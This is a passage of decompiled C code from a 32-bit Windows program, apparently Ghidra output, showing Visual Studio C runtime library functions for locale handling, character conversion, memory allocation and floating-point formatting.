    if ((LONG *)param_1[0x2e] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2e]);
    }
    if ((LONG *)param_1[0x2d] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2d]);
    }
    if ((LONG *)param_1[0x30] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x30]);
    }
    pLVar2 = param_1 + 0x14;
    param_1 = (LONG *)0x6;
    do {
      if (((undefined *)pLVar2[-2] != &DAT_00419c44) && ((LONG *)*pLVar2 != (LONG *)0x0)) {
        InterlockedDecrement((LONG *)*pLVar2);
      }
      if ((pLVar2[-1] != 0) && ((LONG *)pLVar2[1] != (LONG *)0x0)) {
        InterlockedDecrement((LONG *)pLVar2[1]);
      }
      pLVar2 = pLVar2 + 4;
      param_1 = (LONG *)((int)param_1 + -1);
    } while (param_1 != (LONG *)0x0);
    InterlockedDecrement((LONG *)(pLVar1[0x35] + 0xb4));
  }
  return pLVar1;
}



/* Function: ___freetlocinfo */

/* Library Function - Single Match
    ___freetlocinfo
   
   Library: Visual Studio 2010 Release */

void __cdecl ___freetlocinfo(void *param_1)

{
  int *piVar1;
  undefined **ppuVar2;
  void *_Memory;
  undefined4 *puVar3;
  
  _Memory = param_1;
  if ((((*(undefined ***)((int)param_1 + 0xbc) != (undefined **)0x0) &&
       (*(undefined ***)((int)param_1 + 0xbc) != &PTR_DAT_00419eb8)) &&
      (*(int **)((int)param_1 + 0xb0) != (int *)0x0)) && (**(int **)((int)param_1 + 0xb0) == 0)) {
    piVar1 = *(int **)((int)param_1 + 0xb8);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      _free(piVar1);
      ___free_lconv_mon(*(int *)((int)param_1 + 0xbc));
    }
    piVar1 = *(int **)((int)param_1 + 0xb4);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      _free(piVar1);
      ___free_lconv_num(*(undefined4 **)((int)param_1 + 0xbc));
    }
    _free(*(void **)((int)param_1 + 0xb0));
    _free(*(void **)((int)param_1 + 0xbc));
  }
  if ((*(int **)((int)param_1 + 0xc0) != (int *)0x0) && (**(int **)((int)param_1 + 0xc0) == 0)) {
    _free((void *)(*(int *)((int)param_1 + 0xc4) + -0xfe));
    _free((void *)(*(int *)((int)param_1 + 0xcc) + -0x80));
    _free((void *)(*(int *)((int)param_1 + 0xd0) + -0x80));
    _free(*(void **)((int)param_1 + 0xc0));
  }
  ppuVar2 = *(undefined ***)((int)param_1 + 0xd4);
  if ((ppuVar2 != &PTR_DAT_00419c48) && (ppuVar2[0x2d] == (undefined *)0x0)) {
    ___free_lc_time(ppuVar2);
    _free(*(void **)((int)param_1 + 0xd4));
  }
  puVar3 = (undefined4 *)((int)param_1 + 0x50);
  param_1 = (void *)0x6;
  do {
    if ((((undefined *)puVar3[-2] != &DAT_00419c44) &&
        (piVar1 = (int *)*puVar3, piVar1 != (int *)0x0)) && (*piVar1 == 0)) {
      _free(piVar1);
    }
    if (((puVar3[-1] != 0) && (piVar1 = (int *)puVar3[1], piVar1 != (int *)0x0)) && (*piVar1 == 0))
    {
      _free(piVar1);
    }
    puVar3 = puVar3 + 4;
    param_1 = (void *)((int)param_1 + -1);
  } while (param_1 != (void *)0x0);
  _free(_Memory);
  return;
}



/* Function: __updatetlocinfoEx_nolock */

/* Library Function - Single Match
    __updatetlocinfoEx_nolock
   
   Library: Visual Studio 2010 Release */

LONG * __cdecl __updatetlocinfoEx_nolock(undefined4 *param_1,LONG *param_2)

{
  LONG *pLVar1;
  
  if ((param_2 == (LONG *)0x0) || (param_1 == (undefined4 *)0x0)) {
    param_2 = (LONG *)0x0;
  }
  else {
    pLVar1 = (LONG *)*param_1;
    if (pLVar1 != param_2) {
      *param_1 = param_2;
      ___addlocaleref(param_2);
      if (((pLVar1 != (LONG *)0x0) && (___removelocaleref(pLVar1), *pLVar1 == 0)) &&
         (pLVar1 != (LONG *)&DAT_00419db0)) {
        ___freetlocinfo(pLVar1);
      }
    }
  }
  return param_2;
}



/* Function: ___updatetlocinfo */

/* WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4 */
/* WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3 */
/* Library Function - Single Match
    ___updatetlocinfo
   
   Library: Visual Studio 2010 Release */

pthreadlocinfo __cdecl ___updatetlocinfo(void)

{
  _ptiddata p_Var1;
  pthreadlocinfo ptVar2;
  
  p_Var1 = __getptd();
  if (((p_Var1->_ownlocale & DAT_00419c40) == 0) || (p_Var1->ptlocinfo == (pthreadlocinfo)0x0)) {
    __lock(0xc);
    ptVar2 = (pthreadlocinfo)&p_Var1->ptlocinfo;
    __updatetlocinfoEx_nolock((undefined4 *)ptVar2,(LONG *)PTR_DAT_00419e88);
    FUN_0040e1ed();
  }
  else {
    p_Var1 = __getptd();
    ptVar2 = p_Var1->ptlocinfo;
  }
  if (ptVar2 == (pthreadlocinfo)0x0) {
    __amsg_exit(0x20);
  }
  return ptVar2;
}



/* Function: FUN_0040e1ed */

void FUN_0040e1ed(void)

{
  FUN_0040c0a7(0xc);
  return;
}



/* Function: __get_printf_count_output */

/* Library Function - Single Match
    __get_printf_count_output
   
   Library: Visual Studio 2010 Release */

int __cdecl __get_printf_count_output(void)

{
  return (uint)(DAT_0041b928 == (DAT_004191b4 | 1));
}



/* Function: __wctomb_s_l */

/* Library Function - Single Match
    __wctomb_s_l
   
   Library: Visual Studio 2010 Release */

errno_t __cdecl
__wctomb_s_l(int *_SizeConverted,char *_MbCh,size_t _SizeInBytes,wchar_t _WCh,_locale_t _Locale)

{
  char *lpMultiByteStr;
  size_t _Size;
  int iVar1;
  int *piVar2;
  DWORD DVar3;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _Size = _SizeInBytes;
  lpMultiByteStr = _MbCh;
  if ((_MbCh == (char *)0x0) && (_SizeInBytes != 0)) {
    if (_SizeConverted != (int *)0x0) {
      *_SizeConverted = 0;
    }
LAB_0040e233:
    iVar1 = 0;
  }
  else {
    if (_SizeConverted != (int *)0x0) {
      *_SizeConverted = -1;
    }
    if (0x7fffffff < _SizeInBytes) {
      piVar2 = __errno();
      *piVar2 = 0x16;
      FUN_004087f3();
      return 0x16;
    }
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
    if (*(int *)(local_14[0] + 0x14) == 0) {
      if ((ushort)_WCh < 0x100) {
        if (lpMultiByteStr != (char *)0x0) {
          if (_Size == 0) goto LAB_0040e2bf;
          *lpMultiByteStr = (char)_WCh;
        }
        if (_SizeConverted != (int *)0x0) {
          *_SizeConverted = 1;
        }
LAB_0040e2ee:
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        goto LAB_0040e233;
      }
      if ((lpMultiByteStr != (char *)0x0) && (_Size != 0)) {
        _memset(lpMultiByteStr,0,_Size);
      }
    }
    else {
      _MbCh = (char *)0x0;
      iVar1 = WideCharToMultiByte(*(UINT *)(local_14[0] + 4),0,&_WCh,1,lpMultiByteStr,_Size,
                                  (LPCSTR)0x0,(LPBOOL)&_MbCh);
      if (iVar1 == 0) {
        DVar3 = GetLastError();
        if (DVar3 == 0x7a) {
          if ((lpMultiByteStr != (char *)0x0) && (_Size != 0)) {
            _memset(lpMultiByteStr,0,_Size);
          }
LAB_0040e2bf:
          piVar2 = __errno();
          *piVar2 = 0x22;
          FUN_004087f3();
          if (local_8 == '\0') {
            return 0x22;
          }
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
          return 0x22;
        }
      }
      else if (_MbCh == (char *)0x0) {
        if (_SizeConverted != (int *)0x0) {
          *_SizeConverted = iVar1;
        }
        goto LAB_0040e2ee;
      }
    }
    piVar2 = __errno();
    *piVar2 = 0x2a;
    piVar2 = __errno();
    iVar1 = *piVar2;
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  return iVar1;
}



/* Function: _wctomb_s */

/* Library Function - Single Match
    _wctomb_s
   
   Library: Visual Studio 2010 Release */

errno_t __cdecl _wctomb_s(int *_SizeConverted,char *_MbCh,rsize_t _SizeInBytes,wchar_t _WCh)

{
  errno_t eVar1;
  
  eVar1 = __wctomb_s_l(_SizeConverted,_MbCh,_SizeInBytes,_WCh,(_locale_t)0x0);
  return eVar1;
}



/* Function: __isleadbyte_l */

/* Library Function - Single Match
    __isleadbyte_l
   
   Library: Visual Studio 2010 Release */

int __cdecl __isleadbyte_l(int _C,_locale_t _Locale)

{
  ushort uVar1;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  uVar1 = *(ushort *)(*(int *)(local_14[0] + 200) + (_C & 0xffU) * 2);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1 & 0x8000;
}



/* Function: _isleadbyte */

/* Library Function - Single Match
    _isleadbyte
   
   Library: Visual Studio 2010 Release */

int __cdecl _isleadbyte(int _C)

{
  int iVar1;
  
  iVar1 = __isleadbyte_l(_C,(_locale_t)0x0);
  return iVar1;
}



/* Function: __aulldvrm */

/* Library Function - Single Match
    __aulldvrm
   
   Library: Visual Studio 2010 Release */

undefined8 __aulldvrm(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  
  uVar3 = param_1;
  uVar8 = param_4;
  uVar6 = param_2;
  uVar9 = param_3;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar5 = uVar8 >> 1;
      uVar9 = uVar9 >> 1 | (uint)((uVar8 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar8 = uVar5;
      uVar6 = uVar7;
    } while (uVar5 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar9;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar8 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar8)) ||
       ((param_2 <= uVar8 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  return CONCAT44(uVar3,iVar4);
}



/* Function: __mbtowc_l */

/* Library Function - Single Match
    __mbtowc_l
   
   Library: Visual Studio 2010 Release */

int __cdecl __mbtowc_l(wchar_t *_DstCh,char *_SrcCh,size_t _SrcSizeInBytes,_locale_t _Locale)

{
  wchar_t *pwVar1;
  int iVar2;
  int *piVar3;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  if ((_SrcCh != (char *)0x0) && (_SrcSizeInBytes != 0)) {
    if (*_SrcCh != '\0') {
      _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
      if ((local_14.locinfo)->lc_category[0].wlocale != (wchar_t *)0x0) {
        iVar2 = __isleadbyte_l((uint)(byte)*_SrcCh,&local_14);
        if (iVar2 == 0) {
          iVar2 = MultiByteToWideChar((local_14.locinfo)->lc_codepage,9,_SrcCh,1,_DstCh,
                                      (uint)(_DstCh != (wchar_t *)0x0));
          if (iVar2 != 0) goto LAB_0040e4b3;
        }
        else {
          pwVar1 = (local_14.locinfo)->locale_name[3];
          if ((((1 < (int)pwVar1) && ((int)pwVar1 <= (int)_SrcSizeInBytes)) &&
              (iVar2 = MultiByteToWideChar((local_14.locinfo)->lc_codepage,9,_SrcCh,(int)pwVar1,
                                           _DstCh,(uint)(_DstCh != (wchar_t *)0x0)), iVar2 != 0)) ||
             (((local_14.locinfo)->locale_name[3] <= _SrcSizeInBytes && (_SrcCh[1] != '\0')))) {
            pwVar1 = (local_14.locinfo)->locale_name[3];
            if (local_8 == '\0') {
              return (int)pwVar1;
            }
            *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
            return (int)pwVar1;
          }
        }
        piVar3 = __errno();
        *piVar3 = 0x2a;
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        return -1;
      }
      if (_DstCh != (wchar_t *)0x0) {
        *_DstCh = (ushort)(byte)*_SrcCh;
      }
LAB_0040e4b3:
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      return 1;
    }
    if (_DstCh != (wchar_t *)0x0) {
      *_DstCh = L'\0';
    }
  }
  return 0;
}



/* Function: _mbtowc */

/* Library Function - Single Match
    _mbtowc
   
   Library: Visual Studio 2010 Release */

int __cdecl _mbtowc(wchar_t *_DstCh,char *_SrcCh,size_t _SrcSizeInBytes)

{
  int iVar1;
  
  iVar1 = __mbtowc_l(_DstCh,_SrcCh,_SrcSizeInBytes,(_locale_t)0x0);
  return iVar1;
}



/* Function: __calloc_impl */

/* Library Function - Single Match
    __calloc_impl
   
   Library: Visual Studio 2010 Release */

LPVOID __cdecl __calloc_impl(uint param_1,uint param_2,undefined4 *param_3)

{
  int *piVar1;
  LPVOID pvVar2;
  int iVar3;
  uint dwBytes;
  
  if ((param_1 != 0) && (0xffffffe0 / param_1 < param_2)) {
    piVar1 = __errno();
    *piVar1 = 0xc;
    return (LPVOID)0x0;
  }
  dwBytes = param_1 * param_2;
  if (dwBytes == 0) {
    dwBytes = 1;
  }
  do {
    pvVar2 = (LPVOID)0x0;
    if ((dwBytes < 0xffffffe1) &&
       (pvVar2 = HeapAlloc(DAT_0041aeb8,8,dwBytes), pvVar2 != (LPVOID)0x0)) {
      return pvVar2;
    }
    if (DAT_0041b51c == 0) {
      if (param_3 == (undefined4 *)0x0) {
        return pvVar2;
      }
      *param_3 = 0xc;
      return pvVar2;
    }
    iVar3 = __callnewh(dwBytes);
  } while (iVar3 != 0);
  if (param_3 != (undefined4 *)0x0) {
    *param_3 = 0xc;
  }
  return (LPVOID)0x0;
}



/* Function: _realloc */

/* Library Function - Single Match
    _realloc
   
   Library: Visual Studio 2010 Release */

void * __cdecl _realloc(void *_Memory,size_t _NewSize)

{
  void *pvVar1;
  LPVOID pvVar2;
  int iVar3;
  int *piVar4;
  DWORD DVar5;
  
  if (_Memory == (void *)0x0) {
    pvVar1 = _malloc(_NewSize);
    return pvVar1;
  }
  if (_NewSize == 0) {
    _free(_Memory);
  }
  else {
    do {
      if (0xffffffe0 < _NewSize) {
        __callnewh(_NewSize);
        piVar4 = __errno();
        *piVar4 = 0xc;
        return (void *)0x0;
      }
      if (_NewSize == 0) {
        _NewSize = 1;
      }
      pvVar2 = HeapReAlloc(DAT_0041aeb8,0,_Memory,_NewSize);
      if (pvVar2 != (LPVOID)0x0) {
        return pvVar2;
      }
      if (DAT_0041b51c == 0) {
        piVar4 = __errno();
        DVar5 = GetLastError();
        iVar3 = __get_errno_from_oserr(DVar5);
        *piVar4 = iVar3;
        return (void *)0x0;
      }
      iVar3 = __callnewh(_NewSize);
    } while (iVar3 != 0);
    piVar4 = __errno();
    DVar5 = GetLastError();
    iVar3 = __get_errno_from_oserr(DVar5);
    *piVar4 = iVar3;
  }
  return (void *)0x0;
}



/* Function: __freea */

/* Library Function - Single Match
    __freea
   
   Library: Visual Studio 2010 Release */

void __cdecl __freea(void *_Memory)

{
  if ((_Memory != (void *)0x0) && (*(int *)((int)_Memory + -8) == 0xdddd)) {
    _free((int *)((int)_Memory + -8));
  }
  return;
}



/* Function: __wchartodigit */

/* Library Function - Single Match
    __wchartodigit
   
   Library: Visual Studio 2010 Release */

int __cdecl __wchartodigit(ushort param_1)

{
  int iVar1;
  ushort uVar2;
  
  if (0x2f < param_1) {
    if (param_1 < 0x3a) {
      return param_1 - 0x30;
    }
    iVar1 = 0xff10;
    if (param_1 < 0xff10) {
      iVar1 = 0x660;
      if (param_1 < 0x660) {
        return -1;
      }
      if (param_1 < 0x66a) goto LAB_0040e729;
      iVar1 = 0x6f0;
      if (param_1 < 0x6f0) {
        return -1;
      }
      if (param_1 < 0x6fa) goto LAB_0040e729;
      iVar1 = 0x966;
      if (param_1 < 0x966) {
        return -1;
      }
      if (param_1 < 0x970) goto LAB_0040e729;
      iVar1 = 0x9e6;
      if (param_1 < 0x9e6) {
        return -1;
      }
      if (param_1 < 0x9f0) goto LAB_0040e729;
      iVar1 = 0xa66;
      if (param_1 < 0xa66) {
        return -1;
      }
      if (param_1 < 0xa70) goto LAB_0040e729;
      iVar1 = 0xae6;
      if (param_1 < 0xae6) {
        return -1;
      }
      if (param_1 < 0xaf0) goto LAB_0040e729;
      iVar1 = 0xb66;
      if (param_1 < 0xb66) {
        return -1;
      }
      if (param_1 < 0xb70) goto LAB_0040e729;
      iVar1 = 0xc66;
      if (param_1 < 0xc66) {
        return -1;
      }
      if (param_1 < 0xc70) goto LAB_0040e729;
      iVar1 = 0xce6;
      if (param_1 < 0xce6) {
        return -1;
      }
      if (param_1 < 0xcf0) goto LAB_0040e729;
      iVar1 = 0xd66;
      if (param_1 < 0xd66) {
        return -1;
      }
      if (param_1 < 0xd70) goto LAB_0040e729;
      iVar1 = 0xe50;
      if (param_1 < 0xe50) {
        return -1;
      }
      if (param_1 < 0xe5a) goto LAB_0040e729;
      iVar1 = 0xed0;
      if (param_1 < 0xed0) {
        return -1;
      }
      if (param_1 < 0xeda) goto LAB_0040e729;
      iVar1 = 0xf20;
      if (param_1 < 0xf20) {
        return -1;
      }
      if (param_1 < 0xf2a) goto LAB_0040e729;
      iVar1 = 0x1040;
      if (param_1 < 0x1040) {
        return -1;
      }
      if (param_1 < 0x104a) goto LAB_0040e729;
      iVar1 = 0x17e0;
      if (param_1 < 0x17e0) {
        return -1;
      }
      if (param_1 < 0x17ea) goto LAB_0040e729;
      iVar1 = 0x1810;
      if (param_1 < 0x1810) {
        return -1;
      }
      uVar2 = 0x181a;
    }
    else {
      uVar2 = 0xff1a;
    }
    if (param_1 < uVar2) {
LAB_0040e729:
      return (uint)param_1 - iVar1;
    }
  }
  return -1;
}



/* Function: _iswctype */

/* Library Function - Single Match
    _iswctype
   
   Library: Visual Studio 2010 Release */

int __cdecl _iswctype(wint_t _C,wctype_t _Type)

{
  BOOL BVar1;
  WORD local_8 [2];
  
  if (_C != 0xffff) {
    if (_C < 0x100) {
      local_8[0] = *(WORD *)(PTR_DAT_00419f10 + (uint)_C * 2);
    }
    else {
      BVar1 = GetStringTypeW(1,(LPCWSTR)&_C,1,local_8);
      if (BVar1 == 0) {
        local_8[0] = 0;
      }
    }
    return (uint)(local_8[0] & _Type);
  }
  return 0;
}



/* Function: __allmul */

/* Library Function - Single Match
    __allmul
   
   Library: Visual Studio */

longlong __allmul(uint param_1,int param_2,uint param_3,int param_4)

{
  if (param_4 == 0 && param_2 == 0) {
    return (ulonglong)param_1 * (ulonglong)param_3;
  }
  return CONCAT44((int)((ulonglong)param_1 * (ulonglong)param_3 >> 0x20) +
                  param_2 * param_3 + param_1 * param_4,
                  (int)((ulonglong)param_1 * (ulonglong)param_3));
}



/* Function: __forcdecpt_l */

/* Library Function - Single Match
    __forcdecpt_l
   
   Library: Visual Studio 2010 Release */

void __cdecl __forcdecpt_l(char *_Buf,_locale_t _Locale)

{
  byte bVar1;
  byte bVar2;
  int iVar3;
  bool bVar4;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  iVar3 = _tolower((int)*_Buf);
  bVar4 = iVar3 == 0x65;
  while (!bVar4) {
    _Buf = (char *)((byte *)_Buf + 1);
    iVar3 = _isdigit((uint)(byte)*_Buf);
    bVar4 = iVar3 == 0;
  }
  iVar3 = _tolower((int)*_Buf);
  if (iVar3 == 0x78) {
    _Buf = (char *)((byte *)_Buf + 2);
  }
  bVar2 = *_Buf;
  *_Buf = *(byte *)**(undefined4 **)(local_14[0] + 0xbc);
  do {
    _Buf = (char *)((byte *)_Buf + 1);
    bVar1 = *_Buf;
    *_Buf = bVar2;
    bVar2 = bVar1;
  } while (*_Buf != 0);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return;
}



/* Function: __cropzeros_l */

/* Library Function - Single Match
    __cropzeros_l
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release */

void __cdecl __cropzeros_l(char *_Buf,_locale_t _Locale)

{
  char *pcVar1;
  char cVar3;
  int local_14 [2];
  int local_c;
  char local_8;
  char *pcVar2;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  cVar3 = *_Buf;
  if (cVar3 != '\0') {
    do {
      if (cVar3 == *(char *)**(undefined4 **)(local_14[0] + 0xbc)) break;
      _Buf = _Buf + 1;
      cVar3 = *_Buf;
    } while (cVar3 != '\0');
  }
  if (*_Buf != '\0') {
    do {
      _Buf = _Buf + 1;
      cVar3 = *_Buf;
      pcVar1 = _Buf;
      if ((cVar3 == '\0') || (cVar3 == 'e')) break;
    } while (cVar3 != 'E');
    do {
      pcVar2 = pcVar1;
      pcVar1 = pcVar2 + -1;
    } while (*pcVar1 == '0');
    if (*pcVar1 == *(char *)**(undefined4 **)(local_14[0] + 0xbc)) {
      pcVar1 = pcVar2 + -2;
    }
    do {
      cVar3 = *_Buf;
      pcVar1 = pcVar1 + 1;
      _Buf = _Buf + 1;
      *pcVar1 = cVar3;
    } while (cVar3 != '\0');
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return;
}



/* Function: __positive */

/* Library Function - Single Match
    __positive
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release */

int __cdecl __positive(double *arg)

{
  double dVar1;
  
  dVar1 = *arg;
  if (!NAN(dVar1) && 0.0 < dVar1 != (dVar1 == 0.0)) {
    return 1;
  }
  return 0;
}



/* Function: __fassign_l */

/* Library Function - Single Match
    __fassign_l
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release */

void __cdecl __fassign_l(int flag,char *argument,char *number,_locale_t param_4)

{
  _CRT_FLOAT local_c;
  undefined4 local_8;
  
  if (flag == 0) {
    FID_conflict___atoflt_l((_CRT_FLOAT *)&flag,number,param_4);
    *(int *)argument = flag;
  }
  else {
    FID_conflict___atoflt_l(&local_c,number,param_4);
    *(float *)argument = local_c.f;
    *(undefined4 *)(argument + 4) = local_8;
  }
  return;
}



/* Function: __fassign */

/* Library Function - Single Match
    __fassign
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release */

void __cdecl __fassign(int flag,char *argument,char *number)

{
  __fassign_l(flag,argument,number,(_locale_t)0x0);
  return;
}



/* Function: __shift */

/* Library Function - Single Match
    __shift
   
   Library: Visual Studio 2010 Release */

void __shift(void)

{
  char *in_EAX;
  size_t sVar1;
  int unaff_EDI;
  
  if (unaff_EDI != 0) {
    sVar1 = _strlen(in_EAX);
    FID_conflict__memcpy(in_EAX + unaff_EDI,in_EAX,sVar1 + 1);
  }
  return;
}



/* Function: __forcdecpt */

/* Library Function - Single Match
    __forcdecpt
   
   Library: Visual Studio 2010 Release */

void __cdecl __forcdecpt(char *_Buf)

{
  __forcdecpt_l(_Buf,(_locale_t)0x0);
  return;
}



/* Function: __cropzeros */

/* Library Function - Single Match
    __cropzeros
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release */

void __cdecl __cropzeros(char *_Buf)

{
  __cropzeros_l(_Buf,(_locale_t)0x0);
  return;
}



/* Function: __cftoe2_l */

/* Library Function - Single Match
    __cftoe2_l
   
   Library: Visual Studio 2010 Release */

int __cdecl
__cftoe2_l(uint param_1,int param_2,int param_3,int *param_4,char param_5,localeinfo_struct *param_6
          )

{
  undefined1 *in_EAX;
  int *piVar1;
  errno_t eVar2;
  int iVar3;
  undefined1 *puVar4;
  char *_Dst;
  int unaff_EDI;
  int iVar5;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,param_6);
  if ((in_EAX == (undefined1 *)0x0) || (param_1 == 0)) {
    piVar1 = __errno();
    iVar5 = 0x16;
  }
  else {
    iVar5 = param_2;
    if (param_2 < 1) {
      iVar5 = 0;
    }
    if (iVar5 + 9U < param_1) {
      if (param_5 != '\0') {
        __shift();
      }
      puVar4 = in_EAX;
      if (*param_4 == 0x2d) {
        *in_EAX = 0x2d;
        puVar4 = in_EAX + 1;
      }
      if (0 < param_2) {
        *puVar4 = puVar4[1];
        puVar4 = puVar4 + 1;
        *puVar4 = *(undefined1 *)**(undefined4 **)(local_14[0] + 0xbc);
      }
      _Dst = puVar4 + (uint)(param_5 == '\0') + param_2;
      if (param_1 == 0xffffffff) {
        puVar4 = (undefined1 *)0xffffffff;
      }
      else {
        puVar4 = in_EAX + (param_1 - (int)_Dst);
      }
      eVar2 = _strcpy_s(_Dst,(rsize_t)puVar4,"e+000");
      if (eVar2 != 0) {
                    /* WARNING: Subroutine does not return */
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      if (param_3 != 0) {
        *_Dst = 'E';
      }
      if (*(char *)param_4[3] != '0') {
        iVar5 = param_4[1] + -1;
        if (iVar5 < 0) {
          iVar5 = -iVar5;
          _Dst[1] = '-';
        }
        if (99 < iVar5) {
          iVar3 = iVar5 / 100;
          iVar5 = iVar5 % 100;
          _Dst[2] = _Dst[2] + (char)iVar3;
        }
        if (9 < iVar5) {
          iVar3 = iVar5 / 10;
          iVar5 = iVar5 % 10;
          _Dst[3] = _Dst[3] + (char)iVar3;
        }
        _Dst[4] = _Dst[4] + (char)iVar5;
      }
      if (((DAT_0041b940 & 1) != 0) && (_Dst[2] == '0')) {
        unaff_EDI = 3;
        FID_conflict__memcpy(_Dst + 2,_Dst + 3,3);
      }
      if (local_8 == '\0') {
        return unaff_EDI;
      }
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      return unaff_EDI;
    }
    piVar1 = __errno();
    iVar5 = 0x22;
  }
  *piVar1 = iVar5;
  iVar5 = 0x40eaf3;
  FUN_004087f3();
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar5;
}



/* Function: __cftoe_l */

/* Library Function - Single Match
    __cftoe_l
   
   Library: Visual Studio 2010 Release */

void __cdecl
__cftoe_l(double *param_1,undefined1 *param_2,uint param_3,int param_4,int param_5,
         localeinfo_struct *param_6)

{
  int *piVar1;
  size_t _SizeInBytes;
  errno_t eVar2;
  _strflt local_30;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  __fltout2((_CRT_DOUBLE)*param_1,&local_30,local_20,0x16);
  if ((param_2 == (undefined1 *)0x0) || (param_3 == 0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004087f3();
  }
  else {
    if (param_3 == 0xffffffff) {
      _SizeInBytes = 0xffffffff;
    }
    else {
      _SizeInBytes = (param_3 - (local_30.sign == 0x2d)) - (uint)(0 < param_4);
    }
    eVar2 = __fptostr(param_2 + (uint)(0 < param_4) + (uint)(local_30.sign == 0x2d),_SizeInBytes,
                      param_4 + 1,&local_30);
    if (eVar2 == 0) {
      __cftoe2_l(param_3,param_4,param_5,&local_30.sign,'\0',param_6);
    }
    else {
      *param_2 = 0;
    }
  }
  __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



/* Function: __cftoe */

/* Library Function - Single Match
    __cftoe
   
   Library: Visual Studio 2010 Release */

errno_t __cdecl __cftoe(double *_Value,char *_Buf,size_t _SizeInBytes,int _Dec,int _Caps)

{
  errno_t eVar1;
  
  eVar1 = __cftoe_l(_Value,_Buf,_SizeInBytes,_Dec,_Caps,(localeinfo_struct *)0x0);
  return eVar1;
}



/* Function: __cftoa_l */

/* Library Function - Single Match
    __cftoa_l
   
   Library: Visual Studio 2010 Release */

int __cdecl
__cftoa_l(double *param_1,undefined1 *param_2,uint param_3,size_t param_4,int param_5,
         localeinfo_struct *param_6)

{
  ushort uVar1;
  int *piVar2;
  size_t _SizeInBytes;
  errno_t eVar3;
  char *pcVar4;
  char *pcVar5;
  uint uVar6;
  uint uVar7;
  uint extraout_ECX;
  uint extraout_ECX_00;
  uint extraout_ECX_01;
  uint uVar8;
  short sVar9;
  int unaff_EBX;
  char *pcVar10;
  char *pcVar11;
  bool bVar12;
  ulonglong uVar13;
  undefined8 uVar14;
  int iVar15;
  int local_28 [2];
  int local_20;
  char local_1c;
  uint local_18;
  undefined4 local_14;
  uint local_10;
  uint local_c;
  int local_8;
  
  local_18 = 0x3ff;
  local_8 = 0x30;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_28,param_6);
  if ((int)param_4 < 0) {
    param_4 = 0;
  }
  if ((param_2 == (undefined1 *)0x0) || (param_3 == 0)) {
    piVar2 = __errno();
    iVar15 = 0x16;
LAB_0040ed4a:
    *piVar2 = iVar15;
    iVar15 = 0x40ed52;
    FUN_004087f3();
    if (local_1c != '\0') {
      *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
    }
    return iVar15;
  }
